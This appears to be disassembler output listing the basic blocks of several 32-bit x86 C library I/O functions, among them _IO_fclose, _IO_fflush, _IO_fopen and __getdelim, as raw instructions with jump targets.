0xb062e5a:	sub	eax, 0x30
0xb062e5d:	xor	edi, edi
0xb062e5f:	cmp	eax, 9
0xb062e62:	jbe	0xb063010
None
|
|
|
v
0xb062e30:	mov	dword ptr [esp + 0x30], ecx
0xb062e34:	test	byte ptr [esi + 0xc], 0x20
0xb062e38:	je	0xb062e41
None
|
|
|
v
0xb0632fe:	cmp	edx, 0xff
0xb063304:	jg	0xb062f5e
None
|
|
|
v
0xb062e68:	mov	dword ptr [esi + 0x1c], 0xffffffff
0xb062e6f:	mov	dword ptr [esi], 0xffffffff
0xb062e75:	cmp	dword ptr [edx], 0x2e
0xb062e78:	je	0xb062fa8
None
|
|
|
v
0xb063266:	lea	edi, dword ptr [eax - 1]
0xb063269:	mov	dword ptr [esi + 0x24], edi
0xb06326c:	mov	edi, dword ptr [esp + 0x3c]
0xb063270:	mov	edi, dword ptr [edi]
0xb063272:	cmp	eax, edi
0xb063274:	cmovb	eax, edi
0xb063277:	mov	edi, dword ptr [esp + 0x3c]
0xb06327b:	mov	dword ptr [edi], eax
0xb06327d:	mov	eax, dword ptr [ecx + 4]
0xb063280:	jmp	0xb062df1
None
|
|
|
v
0xb063336:	mov	edx, dword ptr [esi + 8]
0xb063339:	test	eax, eax
0xb06333b:	mov	dword ptr [esi + 0x2c], eax
0xb06333e:	jns	0xb0630a0
None
|
|
|
v
0xb0630c1:	mov	dword ptr [esi + 0x18], eax
0xb0630c4:	add	esp, 0x1c
0xb0630c7:	mov	eax, edi
0xb0630c9:	pop	ebx
0xb0630ca:	pop	esi
0xb0630cb:	pop	edi
0xb0630cc:	pop	ebp
0xb0630cd:	ret	
None
|
|
|
v
0xb062f80:	lea	eax, dword ptr [esp + 0x30]
0xb062f84:	call	0xb062d40
None
|
|
|
v
0xb06330a:	mov	eax, dword ptr [ebx + 0xec8]
0xb063310:	mov	eax, dword ptr [eax + edx*4]
0xb063313:	test	eax, eax
0xb063315:	je	0xb062f5e
None
|
|
|
v
0xb062df1:	sub	eax, 0x20
0xb062df4:	mov	ecx, dword ptr [esp + 0x30]
0xb062df8:	cmp	eax, 0x29
0xb062dfb:	ja	0xb062e30
None
|
|
|
v
0xb06331b:	lea	edx, dword ptr [esi + 0x30]
0xb06331e:	mov	dword ptr [esp + 0xc], edx
0xb063322:	lea	edx, dword ptr [esi + 0x28]
0xb063325:	mov	dword ptr [esp + 8], edx
0xb063329:	mov	dword ptr [esp + 4], 1
0xb063331:	mov	dword ptr [esp], esi
0xb063334:	call	eax
None
|
|
|
v
0xb062dfd:	lea	esi, dword ptr [esi]
0xb062e00:	mov	eax, dword ptr [ebx + eax*4 - 0x4f514]
0xb062e07:	add	eax, ebx
0xb062e09:	jmp	eax
None
|
|
|
v
0xb062fd8:	mov	eax, dword ptr [edx + 4]
0xb062fdb:	lea	edi, dword ptr [edx + 4]
0xb062fde:	mov	dword ptr [esp + 0x30], edi
0xb062fe2:	sub	eax, 0x30
0xb062fe5:	cmp	eax, 9
0xb062fe8:	jbe	0xb063180
None
|
|
|
v
0xb062eaf:	mov	eax, dword ptr [ebx + eax*4 - 0x4f46c]
0xb062eb6:	add	eax, ebx
0xb062eb8:	jmp	eax
None
|
|
|
v
0xb0630a6:	test	edx, edx
0xb0630a8:	mov	eax, dword ptr [esp + 0x30]
0xb0630ac:	je	0xb0630f8
None
|
|
|
v
0xb062f42:	mov	dword ptr [esp + 0x30], eax
0xb062f46:	mov	eax, dword ptr [ebx + 0x3768]
0xb062f4c:	mov	dword ptr [esi + 8], edx
0xb062f4f:	mov	dword ptr [esi + 0x30], 0xffffffff
0xb062f56:	test	eax, eax
0xb062f58:	jne	0xb0632fe
None
|
|
|
v
0xb0631d8:	mov	edx, ebp
0xb0631da:	mov	eax, ecx
0xb0631dc:	jmp	0xb062f42
None
|
|
|
v
0xb06319b:	lea	ecx, dword ptr [eax - 1]
0xb06319e:	mov	dword ptr [esi + 0x20], ecx
0xb0631a1:	mov	ecx, dword ptr [esp + 0x3c]
0xb0631a5:	mov	ecx, dword ptr [ecx]
0xb0631a7:	cmp	eax, ecx
0xb0631a9:	cmovb	eax, ecx
0xb0631ac:	mov	ecx, dword ptr [esp + 0x3c]
0xb0631b0:	mov	dword ptr [ecx], eax
0xb0631b2:	add	edx, 4
0xb0631b5:	mov	dword ptr [esp + 0x30], edx
0xb0631b9:	lea	esi, dword ptr [esi]
0xb0631c0:	mov	eax, dword ptr [esi + 0x20]
0xb0631c3:	test	eax, eax
0xb0631c5:	js	0xb062fee
None
|
|
|
v
0xb062e41:	mov	dword ptr [esi + 0x20], 0xffffffff
0xb062e48:	mov	dword ptr [esi + 4], 0
0xb062e4f:	mov	eax, dword ptr [edx]
0xb062e51:	cmp	eax, 0x2a
0xb062e54:	je	0xb062fd8
None
|
|
|
v
0xb062fee:	mov	eax, dword ptr [esp + 0x34]
0xb062ff2:	mov	edx, edi
0xb062ff4:	mov	dword ptr [esp + 0x30], edi
0xb062ff8:	mov	edi, 1
0xb062ffd:	mov	dword ptr [esi + 0x20], eax
0xb063000:	add	eax, 1
0xb063003:	mov	dword ptr [esp + 0x34], eax
0xb063007:	jmp	0xb062e68
None
|
|
|
v
0xb0630ae:	mov	dword ptr [esi + 0x14], eax
0xb0630b1:	mov	dword ptr [esp + 4], 0x25
0xb0630b9:	mov	dword ptr [esp], eax
0xb0630bc:	call	0xb097300
None
|
|
|
v
0xb063208:	mov	dword ptr [esi + 0x2c], 0
0xb06320f:	jmp	0xb0630a0
None
|
|
|
v
0xb062f5e:	lea	ecx, dword ptr [edx - 0x41]
0xb062f61:	cmp	ecx, 0x37
0xb062f64:	mov	dword ptr [esi + 0x2c], 1
0xb062f6b:	ja	0xb063208
None
|
|
|
v
0xb063196:	cmp	eax, 0xff
0xb063199:	je	0xb0631b2
None
|
|
|
v
0xb06322a:	mov	eax, dword ptr [esp + 0x34]
0xb06322e:	add	edi, 1
0xb063231:	mov	edx, ebp
0xb063233:	mov	dword ptr [esp + 0x30], ebp
0xb063237:	mov	dword ptr [esi + 0x1c], eax
0xb06323a:	add	eax, 1
0xb06323d:	mov	dword ptr [esp + 0x34], eax
0xb063241:	jmp	0xb062e7e
None
|
|
|
v
0xb0631e8:	lea	eax, dword ptr [esp + 0x30]
0xb0631ec:	call	0xb062d40
None
|
|
|
v
0xb0632c1:	jmp	0xb06322a
None
|
|
|
v
0xb0631c0:	mov	eax, dword ptr [esi + 0x20]
0xb0631c3:	test	eax, eax
0xb0631c5:	js	0xb062fee
None
|
|
|
v
0xb0630a0:	cmp	dword ptr [esi + 0x24], -1
0xb0630a4:	je	0xb0630e0
None
|
|
|
v
0xb063021:	mov	edx, dword ptr [esp + 0x30]
0xb063025:	jmp	0xb062e68
None
|
|
|
v
0xb0630e7:	mov	ecx, dword ptr [esp + 0x34]
0xb0630eb:	add	edi, eax
0xb0630ed:	test	edx, edx
0xb0630ef:	mov	eax, dword ptr [esp + 0x30]
0xb0630f3:	mov	dword ptr [esi + 0x24], ecx
0xb0630f6:	jne	0xb0630ae
None
|
|
|
v
0xb063180:	lea	eax, dword ptr [esp + 0x30]
0xb063184:	call	0xb062d40
None
|
|
|
v
0xb06318d:	mov	edx, dword ptr [esp + 0x30]
0xb063191:	cmp	dword ptr [edx], 0x24
0xb063194:	jne	0xb0631c0
None
|
|
|
v
0xb06325a:	lea	edx, dword ptr [ecx + 4]
0xb06325d:	cmp	eax, 0xff
0xb063260:	mov	dword ptr [esp + 0x30], edx
0xb063264:	je	0xb06327d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_fclose
TOTAL BLOCKS :48
0xb0636fc:	jmp	0xb0635e6
None
|
|
|
v
0xb063544:	lock cmpxchg	dword ptr [edi], ecx
0xb063548:	jne	0xb0636d9
None
|
|
|
v
0xb063535:	mov	ecx, 1
0xb06353a:	cmp	dword ptr gs:[0xc], 0
0xb063542:	je	0xb063545
None
|
|
|
v
0xb063600:	lock sub	dword ptr [ebx + 0x3668], 1
None
|
|
|
v
0xb06351d:	mov	eax, edx
0xb06351f:	and	eax, 0x8000
0xb063524:	jne	0xb06355f
None
|
|
|
v
0xb0636f1:	lea	ecx, dword ptr [ebx + 0x3668]
0xb0636f7:	call	0xb0f9430
None
|
|
|
v
0xb0636d9:	lea	ecx, dword ptr [edi]
0xb0636db:	call	0xb0f9430
None
|
|
|
v
0xb06370c:	jmp	0xb06360e
None
|
|
|
v
0xb063698:	add	esp, 0x1c
0xb06369b:	pop	ebx
0xb06369c:	pop	esi
0xb06369d:	pop	edi
0xb06369e:	pop	ebp
0xb06369f:	ret	
None
|
|
|
v
0xb063628:	mov	dword ptr [esi], 0
0xb06362e:	mov	dword ptr [esp], esi
0xb063631:	mov	dword ptr [esp + 0xc], edi
0xb063635:	call	0xb017470
None
|
|
|
v
0xb063648:	mov	eax, dword ptr [esi + 0x24]
0xb06364b:	test	eax, eax
0xb06364d:	je	0xb06360e
None
|
|
|
v
0xb0635c4:	mov	ebp, dword ptr [esi + 0x54]
0xb0635c7:	xor	eax, eax
0xb0635c9:	mov	ecx, 1
0xb0635ce:	cmp	dword ptr gs:[0xc], 0
0xb0635d6:	je	0xb0635d9
None
|
|
|
v
0xb0636ec:	jmp	0xb063599
None
|
|
|
v
0xb0635f6:	cmp	dword ptr gs:[0xc], 0
0xb0635fe:	je	0xb063601
None
|
|
|
v
0xb0635d8:	lock cmpxchg	dword ptr [ebx + 0x3668], ecx
0xb0635e0:	jne	0xb0636f1
None
|
|
|
v
0xb06363e:	add	esp, 0x1c
0xb063641:	pop	ebx
0xb063642:	pop	esi
0xb063643:	pop	edi
0xb063644:	pop	ebp
0xb063645:	ret	
None
|
|
|
v
0xb063620:	cmp	esi, dword ptr [ebx + 0xd7c]
0xb063626:	je	0xb06363e
None
|
|
|
v
0xb06363a:	mov	eax, dword ptr [esp + 0xc]
0xb06363e:	add	esp, 0x1c
0xb063641:	pop	ebx
0xb063642:	pop	esi
0xb063643:	pop	edi
0xb063644:	pop	ebp
0xb063645:	ret	
None
|
|
|
v
0xb0636e0:	jmp	0xb06354e
None
|
|
|
v
0xb06358f:	lock sub	dword ptr [edx], 1
None
|
|
|
v
0xb063608:	jne	0xb063701
None
|
|
|
v
0xb063660:	mov	dword ptr [esp], esi
0xb063663:	call	0xb0701b0
None
|
|
|
v
0xb06360e:	cmp	esi, dword ptr [ebx + 0xd84]
0xb063614:	mov	eax, edi
0xb063616:	je	0xb06363e
None
|
|
|
v
0xb063570:	and	ch, 0x80
0xb063573:	jne	0xb0635a0
None
|
|
|
v
0xb0635e6:	mov	eax, dword ptr [ebp + 0x24]
0xb0635e9:	call	0xb01b6a0
None
|
|
|
v
0xb063593:	jne	0xb0636e5
None
|
|
|
v
0xb063701:	lea	eax, dword ptr [ebx + 0x3668]
0xb063707:	call	0xb0f9460
None
|
|
|
v
0xb0636e5:	lea	eax, dword ptr [edx]
0xb0636e7:	call	0xb0f9460
None
|
|
|
v
0xb063599:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb06357e:	mov	dword ptr [edx + 8], 0
0xb063585:	cmp	dword ptr gs:[0xc], 0
0xb06358d:	je	0xb063590
None
|
|
|
v
0xb063678:	mov	dword ptr [esp], esi
0xb06367b:	call	0xb06f420
None
|
|
|
v
0xb06364f:	mov	dword ptr [esp], esi
0xb063652:	call	0xb070880
None
|
|
|
v
0xb06355f:	mov	edi, edx
0xb063561:	shl	edi, 0x1a
0xb063564:	sar	edi, 0x1f
0xb063567:	and	dh, 0x20
0xb06356a:	jne	0xb063678
None
|
|
|
v
0xb063526:	mov	edi, dword ptr [esi + 0x48]
0xb063529:	mov	ebp, dword ptr gs:[8]
0xb063530:	cmp	ebp, dword ptr [edi + 8]
0xb063533:	je	0xb063559
None
|
|
|
v
0xb0635ee:	mov	eax, dword ptr [ebp + 0x50]
0xb0635f1:	call	0xb01b6a0
None
|
|
|
v
0xb063559:	add	dword ptr [edi + 4], 1
0xb06355d:	mov	ecx, edx
0xb06355f:	mov	edi, edx
0xb063561:	shl	edi, 0x1a
0xb063564:	sar	edi, 0x1f
0xb063567:	and	dh, 0x20
0xb06356a:	jne	0xb063678
None
|
|
|
v
0xb0634f0:	push	ebp
0xb0634f1:	push	edi
0xb0634f2:	push	esi
0xb0634f3:	push	ebx
0xb0634f4:	sub	esp, 0x1c
0xb0634f7:	mov	esi, dword ptr [esp + 0x30]
0xb0634fb:	call	0xb1267db
None
|
|
|
v
0xb0635a0:	movsx	eax, byte ptr [esi + 0x46]
0xb0635a4:	mov	eax, dword ptr [esi + eax + 0x94]
0xb0635ab:	mov	dword ptr [esp + 4], 0
0xb0635b3:	mov	dword ptr [esp], esi
0xb0635b6:	call	dword ptr [eax + 8]
None
|
|
|
v
0xb063690:	mov	dword ptr [esp], esi
0xb063693:	call	0xb126b90
None
|
|
|
v
0xb063657:	jmp	0xb06360e
None
|
|
|
v
0xb063668:	mov	edx, dword ptr [esi]
0xb06366a:	mov	ecx, edx
0xb06366c:	jmp	0xb06351d
None
|
|
|
v
0xb063575:	mov	edx, dword ptr [esi + 0x48]
0xb063578:	sub	dword ptr [edx + 4], 1
0xb06357c:	jne	0xb0635a0
None
|
|
|
v
0xb063500:	add	ebx, 0x147b00
0xb063506:	cmp	byte ptr [esi + 0x46], 0
0xb06350a:	jne	0xb063690
None
|
|
|
v
0xb0635b9:	mov	edx, dword ptr [esi + 0x68]
0xb0635bc:	test	edx, edx
0xb0635be:	jle	0xb063648
None
|
|
|
v
0xb063680:	mov	edi, eax
0xb063682:	mov	ecx, dword ptr [esi]
0xb063684:	jmp	0xb063570
None
|
|
|
v
0xb06354e:	mov	eax, dword ptr [esi + 0x48]
0xb063551:	mov	edi, dword ptr [esi + 0x48]
0xb063554:	mov	edx, dword ptr [esi]
0xb063556:	mov	dword ptr [eax + 8], ebp
0xb063559:	add	dword ptr [edi + 4], 1
0xb06355d:	mov	ecx, edx
0xb06355f:	mov	edi, edx
0xb063561:	shl	edi, 0x1a
0xb063564:	sar	edi, 0x1f
0xb063567:	and	dh, 0x20
0xb06356a:	jne	0xb063678
None
|
|
|
v
0xb063510:	mov	edx, dword ptr [esi]
0xb063512:	test	dh, 0x20
0xb063515:	mov	ecx, edx
0xb063517:	jne	0xb063660
None
|
|
|
v
0xb063618:	cmp	esi, dword ptr [ebx + 0xd80]
0xb06361e:	je	0xb06363e
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_fflush
TOTAL BLOCKS :24
0xb063a84:	lea	ecx, dword ptr [edx]
0xb063a86:	call	0xb0f9430
None
|
|
|
v
0xb063a27:	lock sub	dword ptr [ecx], 1
None
|
|
|
v
0xb0639d4:	lock cmpxchg	dword ptr [edx], ecx
0xb0639d8:	jne	0xb063a84
None
|
|
|
v
0xb0639c5:	mov	ecx, 1
0xb0639ca:	cmp	dword ptr gs:[0xc], 0
0xb0639d2:	je	0xb0639d5
None
|
|
|
v
0xb063a97:	jmp	0xb063a2d
None
|
|
|
v
0xb0639ad:	mov	eax, dword ptr [esi]
0xb0639af:	and	eax, 0x8000
0xb0639b4:	jne	0xb0639eb
None
|
|
|
v
0xb063a90:	lea	eax, dword ptr [ecx]
0xb063a92:	call	0xb0f9460
None
|
|
|
v
0xb063a8b:	jmp	0xb0639de
None
|
|
|
v
0xb063a30:	add	esp, 0x10
0xb063a33:	mov	eax, edx
0xb063a35:	pop	ebx
0xb063a36:	pop	esi
0xb063a37:	pop	edi
0xb063a38:	ret	
None
|
|
|
v
0xb063a2b:	jne	0xb063a90
None
|
|
|
v
0xb071726:	add	ebx, 0x1398da
0xb07172c:	sub	esp, 0x18
0xb07172f:	mov	dword ptr [esp], 1
0xb071736:	call	0xb071350
None
|
|
|
v
0xb063990:	push	edi
0xb063991:	push	esi
0xb063992:	push	ebx
0xb063993:	sub	esp, 0x10
0xb063996:	mov	esi, dword ptr [esp + 0x20]
0xb06399a:	call	0xb1267db
None
|
|
|
v
0xb0639de:	mov	eax, dword ptr [esi + 0x48]
0xb0639e1:	mov	edx, dword ptr [esi + 0x48]
0xb0639e4:	mov	dword ptr [eax + 8], edi
0xb0639e7:	add	dword ptr [edx + 4], 1
0xb0639eb:	movsx	eax, byte ptr [esi + 0x46]
0xb0639ef:	mov	eax, dword ptr [esi + eax + 0x94]
0xb0639f6:	mov	dword ptr [esp], esi
0xb0639f9:	call	dword ptr [eax + 0x30]
None
|
|
|
v
0xb0639eb:	movsx	eax, byte ptr [esi + 0x46]
0xb0639ef:	mov	eax, dword ptr [esi + eax + 0x94]
0xb0639f6:	mov	dword ptr [esp], esi
0xb0639f9:	call	dword ptr [eax + 0x30]
None
|
|
|
v
0xb0639fc:	xor	edx, edx
0xb0639fe:	test	eax, eax
0xb063a00:	setne	dl
0xb063a03:	neg	edx
0xb063a05:	test	dword ptr [esi], 0x8000
0xb063a0b:	jne	0xb063a30
None
|
|
|
v
0xb063a2d:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb063a16:	mov	dword ptr [ecx + 8], 0
0xb063a1d:	cmp	dword ptr gs:[0xc], 0
0xb063a25:	je	0xb063a28
None
|
|
|
v
0xb07173b:	add	esp, 0x18
0xb07173e:	pop	ebx
0xb07173f:	ret	
None
|
|
|
v
0xb0639e7:	add	dword ptr [edx + 4], 1
0xb0639eb:	movsx	eax, byte ptr [esi + 0x46]
0xb0639ef:	mov	eax, dword ptr [esi + eax + 0x94]
0xb0639f6:	mov	dword ptr [esp], esi
0xb0639f9:	call	dword ptr [eax + 0x30]
None
|
|
|
v
0xb071720:	push	ebx
0xb071721:	call	0xb1267db
None
|
|
|
v
0xb06399f:	add	ebx, 0x147661
0xb0639a5:	test	esi, esi
0xb0639a7:	je	0xb063a40
None
|
|
|
v
0xb0639b6:	mov	edx, dword ptr [esi + 0x48]
0xb0639b9:	mov	edi, dword ptr gs:[8]
0xb0639c0:	cmp	edi, dword ptr [edx + 8]
0xb0639c3:	je	0xb0639e7
None
|
|
|
v
0xb063a40:	add	esp, 0x10
0xb063a43:	pop	ebx
0xb063a44:	pop	esi
0xb063a45:	pop	edi
0xb063a46:	jmp	0xb071720
None
|
|
|
v
0xb063a0d:	mov	ecx, dword ptr [esi + 0x48]
0xb063a10:	sub	dword ptr [ecx + 4], 1
0xb063a14:	jne	0xb063a30
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b063e30
TOTAL BLOCKS :8
0xb063e52:	lea	edx, dword ptr [ebx - 0x7a0]
0xb063e58:	mov	dword ptr [eax + 0x94], edx
0xb063e5e:	mov	ecx, dword ptr [eax + 0x58]
0xb063e61:	mov	dword ptr [ecx + 0xb8], edx
0xb063e67:	pop	ebx
0xb063e68:	ret	
None
|
|
|
v
0xb063e4b:	mov	edx, dword ptr [eax + 0x68]
0xb063e4e:	test	edx, edx
0xb063e50:	jle	0xb063e70
None
|
|
|
v
0xb063e30:	push	ebx
0xb063e31:	mov	eax, dword ptr [esp + 8]
0xb063e35:	call	0xb1267db
None
|
|
|
v
0xb063e5e:	mov	ecx, dword ptr [eax + 0x58]
0xb063e61:	mov	dword ptr [ecx + 0xb8], edx
0xb063e67:	pop	ebx
0xb063e68:	ret	
None
|
|
|
v
0xb063e46:	test	byte ptr [eax], 8
0xb063e49:	je	0xb063e67
None
|
|
|
v
0xb063e70:	lea	edx, dword ptr [ebx - 0x620]
0xb063e76:	mov	dword ptr [eax + 0x94], edx
0xb063e7c:	lea	edx, dword ptr [ebx - 0x7a0]
0xb063e82:	jmp	0xb063e5e
None
|
|
|
v
0xb063e3a:	add	ebx, 0x1471c6
0xb063e40:	test	byte ptr [eax + 0x3c], 1
0xb063e44:	je	0xb063e67
None
|
|
|
v
0xb063e67:	pop	ebx
0xb063e68:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b063e90
TOTAL BLOCKS :13
0xb063ee7:	lea	eax, dword ptr [ebx - 0x560]
0xb063eed:	mov	dword ptr [esp], esi
0xb063ef0:	mov	dword ptr [esi + 0x94], eax
0xb063ef6:	call	0xb06f3f0
None
|
|
|
v
0xb063efb:	mov	eax, dword ptr [esp + 0x38]
0xb063eff:	mov	dword ptr [esp], esi
0xb063f02:	mov	dword ptr [esp + 0xc], eax
0xb063f06:	mov	eax, dword ptr [esp + 0x34]
0xb063f0a:	mov	dword ptr [esp + 8], eax
0xb063f0e:	mov	eax, dword ptr [esp + 0x30]
0xb063f12:	mov	dword ptr [esp + 4], eax
0xb063f16:	call	0xb06f750
None
|
|
|
v
0xb063f1f:	mov	dword ptr [esp], esi
0xb063f22:	call	0xb063e30
None
|
|
|
v
0xb063f30:	xor	eax, eax
0xb063f32:	jmp	0xb063f27
None
|
|
|
v
0xb063f27:	add	esp, 0x24
0xb063f2a:	pop	ebx
0xb063f2b:	pop	esi
0xb063f2c:	ret	
None
|
|
|
v
0xb063f44:	mov	dword ptr [esp], esi
0xb063f47:	call	0xb017470
None
|
|
|
v
0xb063eac:	test	eax, eax
0xb063eae:	mov	esi, eax
0xb063eb0:	je	0xb063f30
None
|
|
|
v
0xb063f4c:	mov	eax, dword ptr [esp + 0x1c]
0xb063f50:	jmp	0xb063f27
None
|
|
|
v
0xb063e97:	add	ebx, 0x147169
0xb063e9d:	sub	esp, 0x24
0xb063ea0:	mov	dword ptr [esp], 0x160
0xb063ea7:	call	0xb0173f0
None
|
|
|
v
0xb063f1b:	test	eax, eax
0xb063f1d:	je	0xb063f38
None
|
|
|
v
0xb063f38:	mov	dword ptr [esp], esi
0xb063f3b:	mov	dword ptr [esp + 0x1c], eax
0xb063f3f:	call	0xb0701b0
None
|
|
|
v
0xb063eb2:	lea	eax, dword ptr [eax + 0x98]
0xb063eb8:	mov	dword ptr [esi + 0x48], eax
0xb063ebb:	lea	eax, dword ptr [ebx - 0x6e0]
0xb063ec1:	mov	dword ptr [esp + 0x10], eax
0xb063ec5:	lea	eax, dword ptr [esi + 0xa4]
0xb063ecb:	mov	dword ptr [esp + 0xc], eax
0xb063ecf:	mov	dword ptr [esp + 8], 0
0xb063ed7:	mov	dword ptr [esp + 4], 0
0xb063edf:	mov	dword ptr [esp], esi
0xb063ee2:	call	0xb0710c0
None
|
|
|
v
0xb063e90:	push	esi
0xb063e91:	push	ebx
0xb063e92:	call	0xb1267db
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_fopen
TOTAL BLOCKS :3
0xb063f6d:	add	ebx, 0x147093
0xb063f73:	mov	dword ptr [esp + 8], 1
0xb063f7b:	mov	dword ptr [esp + 4], eax
0xb063f7f:	mov	eax, dword ptr [esp + 0x20]
0xb063f83:	mov	dword ptr [esp], eax
0xb063f86:	call	0xb063e90
None
|
|
|
v
0xb063f60:	push	ebx
0xb063f61:	sub	esp, 0x18
0xb063f64:	mov	eax, dword ptr [esp + 0x24]
0xb063f68:	call	0xb1267db
None
|
|
|
v
0xb063f8b:	add	esp, 0x18
0xb063f8e:	pop	ebx
0xb063f8f:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__getdelim
TOTAL BLOCKS :50
0xb064baa:	cmp	eax, 0xff
0xb064bad:	jne	0xb064bbc
None
|
|
|
v
0xb064990:	push	ebp
0xb064991:	push	edi
0xb064992:	push	esi
0xb064993:	push	ebx
0xb064994:	sub	esp, 0x2c
0xb064997:	mov	esi, dword ptr [esp + 0x40]
0xb06499b:	call	0xb1267db
None
|
|
|
v
0xb064a21:	mov	eax, dword ptr [esp + 0x44]
0xb064a25:	mov	dword ptr [eax], 0x78
0xb064a2b:	mov	dword ptr [esp], 0x78
0xb064a32:	call	0xb0173f0
None
|
|
|
v
0xb064a87:	mov	edx, dword ptr [esp + 0x1c]
0xb064a8b:	test	eax, eax
0xb064a8d:	je	0xb064bb0
None
|
|
|
v
0xb064c4c:	lea	eax, dword ptr [edx]
0xb064c4e:	call	0xb0f9460
None
|
|
|
v
0xb064c47:	jmp	0xb0649f3
None
|
|
|
v
0xb064a68:	add	ecx, ecx
0xb064a6a:	cmp	eax, ecx
0xb064a6c:	cmovae	ecx, eax
0xb064a6f:	mov	eax, dword ptr [esp + 0x40]
0xb064a73:	mov	dword ptr [esp + 4], ecx
0xb064a77:	mov	ebp, ecx
0xb064a79:	mov	dword ptr [esp + 0x1c], edx
0xb064a7d:	mov	eax, dword ptr [eax]
0xb064a7f:	mov	dword ptr [esp], eax
0xb064a82:	call	0xb0173e0
None
|
|
|
v
0xb064b80:	add	esp, 0x2c
0xb064b83:	mov	eax, ecx
0xb064b85:	pop	ebx
0xb064b86:	pop	esi
0xb064b87:	pop	edi
0xb064b88:	pop	ebp
0xb064b89:	ret	
None
|
|
|
v
0xb064b7d:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb064b48:	mov	dword ptr [esp + 0x18], 0xffffffff
0xb064b50:	and	dh, 0x80
0xb064b53:	mov	ecx, dword ptr [esp + 0x18]
0xb064b57:	jne	0xb064b80
None
|
|
|
v
0xb064b77:	jne	0xb064c4c
None
|
|
|
v
0xb064c53:	jmp	0xb064b7d
None
|
|
|
v
0xb064bc9:	mov	eax, dword ptr [ebx - 0xdc]
0xb064bcf:	mov	ecx, 0xffffffff
0xb064bd4:	mov	edx, dword ptr gs:[0]
0xb064bdb:	mov	dword ptr [edx + eax], 0x16
0xb064be2:	jmp	0xb064b80
None
|
|
|
v
0xb064a04:	and	ecx, 0x20
0xb064a07:	jne	0xb064b48
None
|
|
|
v
0xb064ad1:	cmp	eax, 0xff
0xb064ad4:	je	0xb064b90
None
|
|
|
v
0xb064a45:	mov	ebp, dword ptr [edi + 4]
0xb064a48:	mov	esi, dword ptr [edi + 8]
0xb064a4b:	sub	esi, ebp
0xb064a4d:	test	esi, esi
0xb064a4f:	jle	0xb064ba2
None
|
|
|
v
0xb064ba2:	mov	dword ptr [esp], edi
0xb064ba5:	call	0xb070930
None
|
|
|
v
0xb064baf:	nop	
None
|
|
|
v
0xb0649e9:	lock cmpxchg	dword ptr [edx], ecx
0xb0649ed:	jne	0xb064c40
None
|
|
|
v
0xb064b1c:	mov	ecx, dword ptr [esp + 0x44]
0xb064b20:	mov	eax, dword ptr [esp + 0x14]
0xb064b24:	mov	ecx, dword ptr [ecx]
0xb064b26:	add	eax, esi
0xb064b28:	mov	dword ptr [esp + 0x18], eax
0xb064b2c:	add	eax, 1
0xb064b2f:	cmp	eax, ecx
0xb064b31:	ja	0xb064a68
None
|
|
|
v
0xb064b04:	mov	esi, eax
0xb064b06:	sub	esi, ebp
0xb064b08:	add	esi, 1
0xb064b0b:	mov	eax, 0x7fffffff
0xb064b10:	sub	eax, dword ptr [esp + 0x14]
0xb064b14:	cmp	esi, eax
0xb064b16:	jge	0xb064be4
None
|
|
|
v
0xb0649cb:	mov	edx, dword ptr [edi + 0x48]
0xb0649ce:	mov	esi, dword ptr gs:[8]
0xb0649d5:	cmp	esi, dword ptr [edx + 8]
0xb0649d8:	je	0xb0649fe
None
|
|
|
v
0xb064b59:	mov	edx, dword ptr [edi + 0x48]
0xb064b5c:	sub	dword ptr [edx + 4], 1
0xb064b60:	jne	0xb064b80
None
|
|
|
v
0xb0649be:	mov	ecx, dword ptr [edi]
0xb0649c0:	mov	eax, ecx
0xb0649c2:	mov	edx, ecx
0xb0649c4:	and	eax, 0x8000
0xb0649c9:	jne	0xb064a04
None
|
|
|
v
0xb064afe:	test	eax, eax
0xb064b00:	mov	edx, eax
0xb064b02:	je	0xb064b0b
None
|
|
|
v
0xb064aba:	mov	edx, dword ptr [esp + 0x1c]
0xb064abe:	add	dword ptr [edi + 4], esi
0xb064ac1:	test	edx, edx
0xb064ac3:	jne	0xb064b90
None
|
|
|
v
0xb064a93:	mov	ecx, dword ptr [esp + 0x40]
0xb064a97:	mov	dword ptr [ecx], eax
0xb064a99:	mov	ecx, dword ptr [esp + 0x44]
0xb064a9d:	mov	dword ptr [ecx], ebp
0xb064a9f:	mov	ebp, dword ptr [edi + 4]
0xb064aa2:	add	eax, dword ptr [esp + 0x14]
0xb064aa6:	mov	dword ptr [esp + 8], esi
0xb064aaa:	mov	dword ptr [esp + 4], ebp
0xb064aae:	mov	dword ptr [esp], eax
0xb064ab1:	mov	dword ptr [esp + 0x1c], edx
0xb064ab5:	call	0xb07d0b0
None
|
|
|
v
0xb0649fe:	add	dword ptr [edx + 4], 1
0xb064a02:	mov	edx, ecx
0xb064a04:	and	ecx, 0x20
0xb064a07:	jne	0xb064b48
None
|
|
|
v
0xb0649b2:	mov	ecx, dword ptr [esp + 0x44]
0xb0649b6:	test	ecx, ecx
0xb0649b8:	je	0xb064bc9
None
|
|
|
v
0xb064a17:	mov	eax, dword ptr [esp + 0x44]
0xb064a1b:	mov	eax, dword ptr [eax]
0xb064a1d:	test	eax, eax
0xb064a1f:	jne	0xb064a45
None
|
|
|
v
0xb064b50:	and	dh, 0x80
0xb064b53:	mov	ecx, dword ptr [esp + 0x18]
0xb064b57:	jne	0xb064b80
None
|
|
|
v
0xb064b37:	mov	eax, dword ptr [esp + 0x40]
0xb064b3b:	mov	eax, dword ptr [eax]
0xb064b3d:	jmp	0xb064aa2
None
|
|
|
v
0xb064ac9:	mov	dword ptr [esp], edi
0xb064acc:	call	0xb070930
None
|
|
|
v
0xb064c40:	lea	ecx, dword ptr [edx]
0xb064c42:	call	0xb0f9430
None
|
|
|
v
0xb064aea:	mov	eax, dword ptr [esp + 0x48]
0xb064aee:	mov	dword ptr [esp + 8], esi
0xb064af2:	mov	dword ptr [esp], ebp
0xb064af5:	mov	dword ptr [esp + 4], eax
0xb064af9:	call	0xb07c430
None
|
|
|
v
